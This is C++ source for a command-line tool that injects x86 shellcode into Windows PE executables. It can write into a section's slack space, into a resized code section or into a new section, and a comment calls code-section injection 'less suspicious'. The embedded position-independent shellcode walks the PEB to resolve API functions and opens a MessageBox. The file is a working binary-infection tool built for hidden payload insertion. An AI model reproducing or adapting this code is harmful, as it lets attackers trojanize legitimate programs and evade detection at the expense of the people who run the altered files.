#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <filesystem>
#include "PE.h"

using namespace std;

int main(int argc, char *argv[])
{
	if (argc < 4)
	{
		std::cout << "Usage: " << argv[0] << " <path_exe> <patched_path_exe> mode\n\
		Example:\n\
		.\InjectPE.exe .\input.exe .\out.exe code - Inject x-code into code section\n\
		.\InjectPE.exe .\input.exe .\out.exe largest - Inject x-code into the largest section\n\
		.\InjectPE.exe .\input.exe .out.exe resize - resize code section and inject into the section\n\
		";
		return EXIT_FAILURE;
	}
	std::experimental::filesystem::path input_file{ argv[1] };
	if (exists(input_file))
	{
		if (!is_regular_file(input_file))
		{
			std::cout << "It's not a regular file\n";
			return EXIT_FAILURE;
		}
	}
	else
	{
		std::cout << "File does not exist\n";
		return EXIT_FAILURE;
	}
	auto outfile = std::experimental::filesystem::path{ argv[2] }.generic_string();

	tuple<bool, char*, fstream::pos_type>  bin = PE::OpenBinary(input_file.generic_string());
	if (!get<0>(bin))
	{
		cout << "Error to open file";
		return EXIT_FAILURE;
	}
	char* PE_file = get<1>(bin);
	size_t size_of_pe = get<2>(bin);

	// Open MessageBox
	char xcode[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";

	string mode = argv[3];
	if (mode == "largest")
		PE::Inject_into_Largest_Tail(PE_file, size_of_pe, xcode, sizeof xcode, outfile);
	else if (mode == "code")
		PE::Inject_into_code_tail(PE_file, size_of_pe, xcode, sizeof xcode, outfile); // less suspicious
	else if (mode == "resize")
		PE::Inject_Resize_Code(PE_file, size_of_pe, xcode, sizeof xcode, outfile);
	else if (mode == "new")
		PE::Inject_New_Section(PE_file, size_of_pe, xcode, sizeof xcode, outfile);
	else
	{
		std::cout << "Incorrect mode\n";
		return EXIT_FAILURE;
	}
	return 0;
}